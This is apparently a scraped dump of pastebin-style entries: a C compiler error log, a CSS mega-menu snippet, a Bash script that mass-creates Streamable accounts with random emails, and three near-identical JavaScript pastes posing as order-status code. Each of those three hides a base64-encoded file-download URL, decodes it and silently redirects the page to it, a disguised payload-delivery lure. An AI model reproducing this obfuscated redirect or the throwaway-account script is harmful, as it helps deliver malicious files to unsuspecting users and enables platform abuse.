svm/svm_main.c:42:5: error: ‘svm_incoming_queue’ undeclared (first use in this function)
   42 |     svm_incoming_queue = queue_create(100);
      |     ^~~~~~~~~~~~~~~~~~
svm/svm_main.c:42:26: warning: implicit declaration of function ‘queue_create’ [-Wimplicit-function-declaration]
   42 |     svm_incoming_queue = queue_create(100);
      |                          ^~~~~~~~~~~~
svm/svm_main.c:43:5: error: ‘svm_outgoing_queue’ undeclared (first use in this function)
   43 |     svm_outgoing_queue = queue_create(100);
      |     ^~~~~~~~~~~~~~~~~~
svm/svm_main.c:47:22: error: storage size of ‘sa’ isn’t known
   47 |     struct sigaction sa;
      |                      ^~
svm/svm_main.c:48:5: warning: implicit declaration of function ‘memset’ [-Wimplicit-function-declaration]
   48 |     memset(&sa, 0, sizeof(sa));
      |     ^~~~~~
svm/svm_main.c:6:1: note: include ‘<string.h>’ or provide a declaration of ‘memset’
    5 | #include ""svm_timers.h"" // Теперь содержит и timer_thread_func, и stop_timer_thread и т.д.
  +++ |+#include <string.h>
    6 | 
svm/svm_main.c:48:5: warning: incompatible implicit declaration of built-in function ‘memset’ [-Wbuiltin-declaration-mismatch]
   48 |     memset(&sa, 0, sizeof(sa));
      |     ^~~~~~
svm/svm_main.c:48:5: note: include ‘<string.h>’ or provide a declaration of ‘memset’
svm/svm_main.c:50:5: warning: implicit declaration of function ‘sigaction’ [-Wimplicit-function-declaration]
   50 |     sigaction(SIGINT, &sa, NULL);
      |     ^~~~~~~~~
svm/svm_main.c:50:15: error: ‘SIGINT’ undeclared (first use in this function)
   50 |     sigaction(SIGINT, &sa, NULL);
      |               ^~~~~~
svm/svm_main.c:51:15: error: ‘SIGTERM’ undeclared (first use in this function)
   51 |     sigaction(SIGTERM, &sa, NULL);
      |               ^~~~~~~
svm/svm_main.c:55:10: error: ‘global_client_handle’ undeclared (first use in this function)
   55 |      if (global_client_handle < 0 && keep_running) {
      |          ^~~~~~~~~~~~~~~~~~~~
svm/svm_main.c:55:38: error: ‘keep_running’ undeclared (first use in this function)
   55 |      if (global_client_handle < 0 && keep_running) {
      |                                      ^~~~~~~~~~~~
svm/svm_main.c:56:10: warning: incompatible implicit declaration of built-in function ‘fprintf’ [-Wbuiltin-declaration-mismatch]
   56 |          fprintf(stderr, ""SVM: Не удалось установить коммуникационный канал.\n"");
      |          ^~~~~~~
svm/svm_main.c:56:10: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
svm/svm_main.c:56:18: error: ‘stderr’ undeclared (first use in this function)
   56 |          fprintf(stderr, ""SVM: Не удалось установить коммуникационный канал.\n"");
      |                  ^~~~~~
svm/svm_main.c:56:18: note: ‘stderr’ is defined in header ‘<stdio.h>’; did you forget to ‘#include <stdio.h>’?
svm/svm_main.c:64:25: error: ‘timer_tid’ undeclared (first use in this function); did you mean ‘timer_t’?
   64 |     if (pthread_create(&timer_tid, NULL, timer_thread_func, NULL) != 0) { perror(""SVM: Failed to create timer thread""); goto cleanup_threads; }
      |                         ^~~~~~~~~
      |                         timer_t
svm/svm_main.c:64:75: warning: implicit declaration of function ‘perror’ [-Wimplicit-function-declaration]
   64 | hread_create(&timer_tid, NULL, timer_thread_func, NULL) != 0) { perror(""SVM: Failed to create timer thread""); goto cleanup_threads; }
      |                                                                 ^~~~~~

svm/svm_main.c:66:25: error: ‘receiver_tid’ undeclared (first use in this function); did you mean ‘receiver_created’?
   66 |     if (pthread_create(&receiver_tid, NULL, receiver_thread_func, NULL) != 0) { perror(""SVM: Failed to create receiver thread""); goto cleanup_threads; }
      |                         ^~~~~~~~~~~~
      |                         receiver_created
svm/svm_main.c:68:25: error: ‘processor_tid’ undeclared (first use in this function); did you mean ‘processor_created’?
   68 |     if (pthread_create(&processor_tid, NULL, processor_thread_func, NULL) != 0) { perror(""SVM: Failed to create processor thread""); goto cleanup_threads; }
      |                         ^~~~~~~~~~~~~
      |                         processor_created
svm/svm_main.c:70:26: error: ‘sender_tid’ undeclared (first use in this function); did you mean ‘sender_created’?
   70 |      if (pthread_create(&sender_tid, NULL, sender_thread_func, NULL) != 0) { perror(""SVM: Failed to create sender thread""); goto cleanup_threads; }
      |                          ^~~~~~~~~~
      |                          sender_created
svm/svm_main.c:94:9: warning: implicit declaration of function ‘shutdown’ [-Wimplicit-function-declaration]
   94 |         shutdown(global_client_handle, SHUT_RDWR);
      |         ^~~~~~~~
svm/svm_main.c:94:40: error: ‘SHUT_RDWR’ undeclared (first use in this function)
   94 |         shutdown(global_client_handle, SHUT_RDWR);
      |                                        ^~~~~~~~~
svm/svm_main.c:109:5: warning: incompatible implicit declaration of built-in function ‘fprintf’ [-Wbuiltin-declaration-mismatch]
  109 |     fprintf(stderr, ""SVM: Ошибка создания одного из потоков. Инициируем остановку созданных...\n"");
      |     ^~~~~~~
svm/svm_main.c:109:5: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
svm/svm_main.c:128:13: error: ‘io_svm’ undeclared (first use in this function)
  128 |         if (io_svm) io_svm->disconnect(io_svm, global_client_handle);
      |             ^~~~~~
svm/svm_main.c:133:9: error: ‘serverSocketFD’ undeclared (first use in this function)
  133 |     if (serverSocketFD >= 0) { // Закрываем слушающий сокет, если он был и не закрыт
      |         ^~~~~~~~~~~~~~
svm/svm_main.c:135:15: warning: implicit declaration of function ‘close’ [-Wimplicit-function-declaration]
  135 |          else close(serverSocketFD);
      |               ^~~~~
svm/svm_main.c:138:29: warning: implicit declaration of function ‘queue_destroy’ [-Wimplicit-function-declaration]
  138 |     if (svm_incoming_queue) queue_destroy(svm_incoming_queue);
      |                             ^~~~~~~~~~~~~
svm/svm_main.c:47:22: warning: unused variable ‘sa’ [-Wunused-variable]
   47 |     struct sigaction sa;
      |                      ^~
make: *** [<встроенное>: svm/svm_main.o] Ошибка 1"
V7QqYTym,Products.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:45:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53420/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UYLNzDWQ,Mega Rejuve menu backup,coffeeandphotos,CSS,Wednesday 9th of April 2025 12:31:34 PM CDT,"//MEGA MENU
.mega {
position: absolute;
width: 100%;
opacity: 0;
left: 0;
bottom: 0px;
visibility: hidden;
pointer-events: none;
transition:transform 1s ease;
transform: translate(0,95%);
 
&:after {
position: absolute;
left: 0;
content: '';
height: 100%;
width: 100%;
z-index: -1;
background: transparent;
top: 5px;
transform: translate(0,-100%);
 
}
 
}
 
.mega:hover {
opacity: 1;
visibility: visible;
pointer-events: auto!important;
-webkit-transition-delay: 0s;
-o-transition-delay: 0s;
transition-delay: 0s;
transform: translate(0,100%);
& * {
pointer-events: auto;
}
}
.folder a {
pointer-events:none;
}
.folder:hover {
& + .mega {
opacity: 1;
pointer-events: auto!important;
visibility: visible;
transform: translate(0,100%);
}
}
 
@media (min-width:991px) {
 
.folder {
z-index:99999 !important;
.header-nav-folder-content {
display: none;
}
}
.header-nav-item,
.header-title,
.header-actions {
z-index: 9;
position: relative !important;
}
.header-background,.header::before,
{
pointer-events: none!important;
}
 
.header-display,
.header-inner {
position: static!important;
}
 
}
 
//LEFT ALIGN TEXT
.mega {
p,h2,h3,h1 {
text-align:left;
}
//remove underlines in links
p a {
border-bottom:0px !important;
}
}
 
.section-background-content img {
visibility:visible !important;
}
 
//background color
//Mega Menu Background color
.mega {
 
.section-background {
background-color: #EBEAEB !important;
}
 
}
//padding
.mega {
.content-wrapper {
padding-top: 5vh !important;
padding-bottom: 5vh !important;
}
}
//typography
.mega {
h3 {
font-size:18px;
font-family: Poppins;
}
h1,h2,h3,h4, p {
text-align:left;
line-height: 1.8;
}
 
}
//END MEGA MENU END"
UntzUwJi,Order.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:29:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00234/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
brWbsUmB,Create a New Account for Uploading Videos,metalx1000,Bash,Wednesday 9th of April 2025 12:21:27 PM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################

random=""$(head -c 16 /dev/urandom | tr -dc a-zA-Z0-9 | head -c 50)""
user=""${random}@yahoo.com""

curl 'https://ajax.streamable.com/users' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.7' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'origin: https://streamable.com' \
  -H 'pragma: no-cache' \
  -H 'priority: u=1, i' \
  -H 'referer: https://streamable.com/' \
  -H 'sec-ch-ua: ""Brave"";v=""135"", ""Not-A.Brand"";v=""8"", ""Chromium"";v=""135""' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: ""Linux""' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'sec-gpc: 1' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
  --data-raw ""{\""username\"":\""$user\"",\""password\"":\""mypassword\"",\""email\"":\""$user\"",\""verification_redirect\"":\""https://streamable.com?alert=verified\""}""

echo -e ""\nCreated account for '$user' with password 'mypassword'""
"
Rpyad2sj,Market.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:14:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
